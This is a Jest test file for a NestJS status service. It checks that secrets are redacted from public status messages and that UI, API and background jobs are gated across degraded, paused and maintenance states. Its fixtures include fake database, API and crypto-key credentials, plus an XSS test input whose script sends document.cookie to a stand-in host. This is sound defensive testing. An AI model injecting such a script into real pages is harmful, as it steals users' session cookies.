import { HttpStatus } from "@nestjs/common";
import { PublicStatusService } from "./public-status.service";
import { PublicStatusController } from "./public-status.controller";
import {
  computeSystemStatusSnapshot,
  containsSecretOrInternalLeak,
  evaluateApiRequestGate,
  evaluateBackgroundJobGate,
  evaluateUiStatusContract,
  redactStatusObject,
  sanitizePublicReason,
  sanitizeStatusText,
} from "./public-status.model";

describe("PublicStatusModel & PublicStatusService", () => {
  const sampleSecrets = {
    DATABASE_URL:
      "postgresql://trellis_admin:SuperSecretDbPass99!@10.24.16.8:5432/trellis_prod",
    REDIS_URL: "redis://:RedisAuthSecretToken12345@redis.internal:6379",
    JWT_SECRET: "jwt_signing_master_secret_key_9988776655",
    STELLAR_SECRET:
      "SB7ZMP544344B27B4H23Z5K4X7A4B2C3D4E5F6G7H8I9J2K3L4M5N6O7",
    ETH_PRIVATE_KEY:
      "0x4c0883a69102937d6231471b5dbb6204fe5129617082792ae468d01a3f362318",
    API_KEY: "sk-live-9876543210abcdef1234567890",
  };

  describe("Secret Redaction & Zero-Leakage Boundary", () => {
    it("scrubs database credentials, Redis tokens, Stellar seeds, ETH keys, JWTs, and internal IPs from public reasons", () => {
      const leakyReason =
        `Pause triggered: connection failed to ${sampleSecrets.DATABASE_URL} ` +
        `and ${sampleSecrets.REDIS_URL} with Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c ` +
        `signer=${sampleSecrets.STELLAR_SECRET} ethKey=${sampleSecrets.ETH_PRIVATE_KEY} ` +
        `apiKey=${sampleSecrets.API_KEY} JWT_SECRET=${sampleSecrets.JWT_SECRET}`;

      const sanitized = sanitizeStatusText(leakyReason, {
        stripInternalHosts: true,
        escapeHtml: true,
        env: sampleSecrets,
      });

      expect(sanitized).not.toContain("SuperSecretDbPass99!");
      expect(sanitized).not.toContain("RedisAuthSecretToken12345");
      expect(sanitized).not.toContain(sampleSecrets.STELLAR_SECRET);
      expect(sanitized).not.toContain(sampleSecrets.ETH_PRIVATE_KEY);
      expect(sanitized).not.toContain(sampleSecrets.API_KEY);
      expect(sanitized).not.toContain(sampleSecrets.JWT_SECRET);
      expect(sanitized).not.toContain("10.24.16.8");
      expect(sanitized).not.toContain("redis.internal");
      expect(containsSecretOrInternalLeak(sanitized)).toBe(false);
    });

    it("replaces raw SQL errors and stack traces with safe public fallback messages", () => {
      const sqlError =
        'QueryFailedError: SELECT "user"."password_hash" FROM "users" WHERE id = $1 at Driver.query (/app/src/driver.ts:142:19)';
      const publicReason = sanitizePublicReason(sqlError, "degraded");

      expect(publicReason).toBe(
        "Some platform services are experiencing elevated latency or partial degradation.",
      );
      expect(publicReason).not.toContain("SELECT");
      expect(publicReason).not.toContain("password_hash");
    });

    it("neutralizes XSS and script tags in UI-rendered status text", () => {
      const xssInput =
        '<script>fetch("https://evil.invalid?c="+document.cookie)</script>Maintenance <img src=x onerror=alert(1)> window';
      const publicReason = sanitizePublicReason(xssInput, "maintenance");

      expect(publicReason).not.toContain("<script>");
      expect(publicReason).not.toContain("onerror");
      expect(publicReason).not.toContain("<img");
    });

    it("redacts sensitive keys and embedded secrets in operator diagnostic objects", () => {
      const rawDiagnostic = {
        component: "oracle",
        signingKey: sampleSecrets.STELLAR_SECRET,
        database_url: sampleSecrets.DATABASE_URL,
        nested: {
          authorization: "Bearer secret_jwt_token_value_123456",
          note: `Error connecting to ${sampleSecrets.REDIS_URL}`,
        },
      };

      const scrubbed = redactStatusObject(rawDiagnostic, sampleSecrets);
      const serialized = JSON.stringify(scrubbed);

      expect(scrubbed.signingKey).toBe("[REDACTED]");
      expect(scrubbed.database_url).toBe("[REDACTED]");
      expect(scrubbed.nested.authorization).toBe("[REDACTED]");
      expect(serialized).not.toContain(sampleSecrets.STELLAR_SECRET);
      expect(serialized).not.toContain("SuperSecretDbPass99!");
      expect(serialized).not.toContain("RedisAuthSecretToken12345");
    });
  });

  describe("State Transitions Across UI, API, and Background Paths", () => {
    let service: PublicStatusService;
    let controller: PublicStatusController;
    let activePauses: any[];
    let readinessState: any;
    let dependencyState: any;
    let emittedEvents: any[];
    let listeners: Record<string, Array<(payload: any) => any>>;

    beforeEach(() => {
      activePauses = [];
      emittedEvents = [];
      listeners = {};

      readinessState = {
        status: "ok",
        components: {
          database: { status: "up", responseTime: 4 },
          redis: { status: "up", responseTime: 2 },
        },
      };

      dependencyState = {
        status: "healthy",
        advisory: "healthy",
        checks: [
          {
            id: "database",
            label: "PostgreSQL",
            criticality: "critical",
            state: "healthy",
            detail: "SELECT 1 in 4ms",
            latencyMs: 4,
            target: "postgresql://user:secret@db.internal:5432/trellis",
            configKeys: [{ key: "DATABASE_URL", configured: true }],
            remediation: "",
          },
          {
            id: "stellar_horizon",
            label: "Stellar Horizon",
            criticality: "critical",
            state: "healthy",
            detail: "HTTP 200 in 35ms",
            latencyMs: 35,
            target: "https://horizon-testnet.stellar.org",
            configKeys: [{ key: "STELLAR_HORIZON_URL", configured: true }],
            remediation: "",
          },
        ],
      };

      const mockHealthService = {
        getReadiness: jest.fn(async () => readinessState),
      };
      const mockDependencyHealthService = {
        run: jest.fn(async () => dependencyState),
      };
      const mockPauseControlService = {
        getActivePauses: jest.fn(async () => activePauses),
      };
      const mockEventEmitter = {
        emit: jest.fn((event: string, payload: any) => {
          emittedEvents.push({ event, payload });
          for (const fn of listeners[event] ?? []) {
            fn(payload);
          }
        }),
        on: jest.fn((event: string, fn: (payload: any) => any) => {
          if (!listeners[event]) listeners[event] = [];
          listeners[event].push(fn);
        }),
      };

      service = new PublicStatusService(
        mockHealthService as any,
        mockDependencyHealthService as any,
        mockPauseControlService as any,
        mockEventEmitter as any,
      );
      service.onModuleInit();
      controller = new PublicStatusController(service);
    });

    it("starts in 'operational' state across UI, API, and background paths", async () => {
      const publicStatus = await service.getPublicStatus();
      const uiBanner = await service.getUiBannerContract();
      const apiDecision = await service.evaluateApiRequest({
        method: "POST",
        path: "/api/v1/defi/stake",
        scope: "defi",
      });
      const bgDecision = await service.evaluateBackgroundJob({
        jobType: "defi.rebalance",
      });

      expect(publicStatus.state).toBe("operational");
      expect(publicStatus.httpStatusCode).toBe(200);
      expect(publicStatus.capabilities.readOnly).toBe(false);
      expect(publicStatus.capabilities.tradingEnabled).toBe(true);

      // UI path
      expect(uiBanner.visible).toBe(false);
      expect(uiBanner.severity).toBe("none");
      expect(uiBanner.websocketEvent.event).toBe("system:status:update");

      // API path
      expect(apiDecision.allowed).toBe(true);
      expect(apiDecision.headers["X-Trellis-System-Status"]).toBe("operational");

      // Background path
      expect(bgDecision.decision).toBe("execute");
      expect(bgDecision.backoffMultiplier).toBe(1);
    });

    it("transitions to 'degraded' when a dependency slows down or a partial scope is paused, adapting UI, API, and background paths", async () => {
      const now = new Date("2026-10-16T10:00:00.000Z");
      await service.declareComponentDegradation(
        {
          componentId: "defi",
          reason:
            "Upstream Ethereum RPC latency elevated at https://user:secretPass@rpc.internal:8545",
          estimatedRecoveryAt: "2026-10-16T10:05:00.000Z",
        },
        "ops-engineer-1",
        now,
      );

      const publicStatus = await service.getPublicStatus({ now });
      const operatorStatus = await service.getOperatorStatus({ now });
      const uiBanner = await service.getUiBannerContract({ now });

      expect(publicStatus.state).toBe("degraded");
      expect(publicStatus.httpStatusCode).toBe(200);
      expect(publicStatus.retryAfterSeconds).toBe(300);
      expect(publicStatus.summary).not.toContain("secretPass");
      expect(publicStatus.summary).not.toContain("rpc.internal");
      expect(publicStatus.components.defi.state).toBe("degraded");

      // Public response never leaks operator IDs or dependency config keys
      expect((publicStatus as any).activePauses).toBeUndefined();
      expect((publicStatus as any).dependencyDiagnostics).toBeUndefined();

      // Operator response includes sanitized diagnostics and runbook guidance
      expect(operatorStatus.rawStateSources.manualDegradedComponents).toContain(
        "defi",
      );
      expect(
        operatorStatus.dependencyDiagnostics.find((d) => d.id === "database")
          ?.sanitizedTarget,
      ).toBe("postgresql://db.internal:5432/trellis");
      expect(operatorStatus.runbook.currentState).toBe("degraded");

      // UI path shows warning banner, keeps capabilities enabled
      expect(uiBanner.visible).toBe(true);
      expect(uiBanner.severity).toBe("warning");
      expect(uiBanner.dismissible).toBe(true);

      // Background path applies 2x adaptive backoff
      const bgDecision = await service.evaluateBackgroundJob(
        { jobType: "reconciliation.sync" },
        { now },
      );
      expect(bgDecision.decision).toBe("execute_with_backoff");
      expect(bgDecision.backoffMultiplier).toBe(2);
    });

    it("transitions to 'paused' when a high-impact scope is paused, blocking only that scope in API & background while leaving other scopes active", async () => {
      const now = new Date("2026-10-16T10:00:00.000Z");
      const expiresAt = new Date("2026-10-16T10:02:00.000Z");

      activePauses.push({
        id: "pause-1",
        scope: "trading",
        active: true,
        reason:
          "Circuit breaker tripped on trading feed (API_KEY=sk-live-secret999888777666)",
        activatedBy: "risk-bot",
        activatedByRole: "ADMIN",
        activatedAt: now,
        expiresAt,
      });

      // Trigger PauseControl event listener
      for (const fn of listeners["pause.activated"] ?? []) {
        await fn({
          scope: "trading",
          reason: activePauses[0].reason,
          actorId: "risk-bot",
        });
      }

      const publicStatus = await service.getPublicStatus({ now });
      const uiBanner = await service.getUiBannerContract({ now });

      expect(publicStatus.state).toBe("paused");
      expect(publicStatus.httpStatusCode).toBe(200);
      expect(publicStatus.retryAfterSeconds).toBe(120);
      expect(publicStatus.summary).not.toContain("sk-live-secret999888777666");
      expect(publicStatus.capabilities.tradingEnabled).toBe(false);
      expect(publicStatus.capabilities.paymentsEnabled).toBe(true);
      expect(publicStatus.capabilities.readOnly).toBe(false);

      // UI path shows non-dismissible error banner
      expect(uiBanner.visible).toBe(true);
      expect(uiBanner.severity).toBe("error");
      expect(uiBanner.dismissible).toBe(false);

      // API path blocks POST to trading with 503 + Retry-After, allows POST to payments & GET to trading
      const blockedTradingWrite = await service.evaluateApiRequest(
        { method: "POST", path: "/api/v1/trade/execute", scope: "trading" },
        { now },
      );
      expect(blockedTradingWrite.allowed).toBe(false);
      expect(blockedTradingWrite.statusCode).toBe(503);
      expect(blockedTradingWrite.headers["Retry-After"]).toBe("120");
      expect(blockedTradingWrite.errorPayload?.errorCode).toBe(
        "SERVICE_UNAVAILABLE",
      );
      expect(blockedTradingWrite.errorPayload?.detail).not.toContain(
        "sk-live-secret999888777666",
      );

      const allowedTradingRead = await service.evaluateApiRequest(
        { method: "GET", path: "/api/v1/trade/quotes", scope: "trading" },
        { now },
      );
      expect(allowedTradingRead.allowed).toBe(true);

      const allowedPaymentWrite = await service.evaluateApiRequest(
        { method: "POST", path: "/api/v1/payments/send", scope: "payments" },
        { now },
      );
      expect(allowedPaymentWrite.allowed).toBe(true);

      // Background path defers trading jobs, executes payment jobs
      const tradingJob = await service.evaluateBackgroundJob(
        { jobType: "trading.execute" },
        { now },
      );
      expect(tradingJob.decision).toBe("defer");
      expect(tradingJob.retryAfterSeconds).toBe(120);

      const paymentJob = await service.evaluateBackgroundJob(
        { jobType: "payments.settle" },
        { now },
      );
      expect(paymentJob.decision).toBe("execute");
    });

    it("transitions to 'maintenance' when maintenance window is activated, enforcing read-only API, UI banner, and background deferral, then recovers cleanly when cleared", async () => {
      const now = new Date("2026-10-16T12:00:00.000Z");
      await service.activateMaintenance(
        {
          reason:
            "Scheduled database migration on postgres://admin:dbSecret123@192.168.1.50:5432/trellis",
          scheduledStartAt: "2026-10-16T12:00:00.000Z",
          estimatedEndAt: "2026-10-16T12:10:00.000Z",
        },
        "release-manager",
        "ADMIN",
        now,
      );

      const mockRes = {
        statusCode: 200,
        headers: {} as Record<string, string>,
        setHeader(k: string, v: string) {
          this.headers[k] = v;
        },
        status(code: number) {
          this.statusCode = code;
          return this;
        },
      };

      const publicStatus = await controller.getPublicStatus(mockRes as any);
      expect(publicStatus.state).toBe("maintenance");
      expect(mockRes.statusCode).toBe(HttpStatus.SERVICE_UNAVAILABLE);
      expect(mockRes.headers["X-Trellis-System-Status"]).toBe("maintenance");
      expect(mockRes.headers["Retry-After"]).toBeDefined();
      expect(publicStatus.summary).not.toContain("dbSecret123");
      expect(publicStatus.summary).not.toContain("192.168.1.50");
      expect(publicStatus.capabilities.readOnly).toBe(true);
      expect(publicStatus.capabilities.backgroundJobsProcessing).toBe(false);

      // Non-admin write blocked
      const userWrite = evaluateApiRequestGate(publicStatus, {
        method: "POST",
        path: "/api/v1/portfolios",
        actorRoles: ["USER"],
      });
      expect(userWrite.allowed).toBe(false);
      expect(userWrite.statusCode).toBe(503);

      // Admin recovery write allowed
      const adminWrite = evaluateApiRequestGate(publicStatus, {
        method: "POST",
        path: "/api/v1/status/maintenance/clear",
        actorRoles: ["ADMIN"],
      });
      expect(adminWrite.allowed).toBe(true);
      expect(adminWrite.bypassReason).toBe("admin_override");

      // Background job deferred unless essential recovery
      const regularJob = evaluateBackgroundJobGate(publicStatus, {
        jobType: "webhook.delivery",
      });
      expect(regularJob.decision).toBe("defer");

      const recoveryJob = evaluateBackgroundJobGate(publicStatus, {
        jobType: "reconciliation.sync",
        isEssentialRecovery: true,
      });
      expect(recoveryJob.decision).toBe("execute");

      // Clear maintenance and verify recovery to operational
      await service.clearMaintenance(
        "Migration completed and verified",
        "release-manager",
        "ADMIN",
        new Date("2026-10-16T12:08:00.000Z"),
      );

      const recoveredStatus = await service.getPublicStatus({
        now: new Date("2026-10-16T12:08:00.000Z"),
      });
      expect(recoveredStatus.state).toBe("operational");
      expect(recoveredStatus.capabilities.readOnly).toBe(false);
      expect(service.getStateHistory().length).toBeGreaterThanOrEqual(2);
      expect(
        emittedEvents.some((e) => e.event === "status.state_changed"),
      ).toBe(true);
    });

    it("auto-expires maintenance windows and pause scopes when estimatedEndAt / expiresAt has passed", () => {
      const pastEnd = "2026-10-16T09:00:00.000Z";
      const now = new Date("2026-10-16T10:00:00.000Z");

      const { publicStatus } = computeSystemStatusSnapshot({
        activePauses: [
          {
            scope: "trading",
            reason: "Temporary halt",
            active: true,
            expiresAt: pastEnd,
          },
        ],
        maintenanceWindow: {
          active: true,
          reason: "Short window",
          estimatedEndAt: pastEnd,
        },
        now,
      });

      expect(publicStatus.state).toBe("operational");
      expect(publicStatus.pausedScopes).toHaveLength(0);
      expect(publicStatus.maintenanceWindow).toBeNull();
    });
  });
});
